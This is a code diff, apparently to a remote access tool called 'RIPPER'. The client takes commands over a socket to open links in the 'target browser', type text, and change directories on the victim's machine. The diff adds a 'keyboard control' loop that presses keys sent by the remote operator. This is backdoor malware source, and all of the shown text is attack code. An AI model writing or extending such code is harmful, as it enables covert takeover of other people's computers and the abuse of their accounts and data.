@@ -124,7 +124,17 @@ def connect():
                 s.send("[RIPPER]  Opened link in target browser".encode('utf-8', errors='ignore'));
             elif command.startswith('keyboard type'):
                 keyboard.write(f'{command[14:]}');
-                s.send(f"[RIPPER]  {command[14:]} Was entered successfully".encode('utf-8', errors='ignore'))
+                s.send(f"[RIPPER]  {command[14:]} Was entered successfully".encode('utf-8', errors='ignore'));
+            elif command.startswith('keyboard control'):
+                s.send(f"[RIPPER]  Are you controlling the keyboard now".encode('utf-8', errors='ignore'));
+                while True:
+                    key = s.recv(1024).decode('utf-8');
+                    key = key.replace("'","");
+                    if key == 'stop':
+                        break;
+                    keyboard.press(key);
+                    keyboard.release(key);
+                    key = s.recv(1024).decode('utf-8');
             elif command.startswith('cd '):
                 dir = command[3:];
                 try:
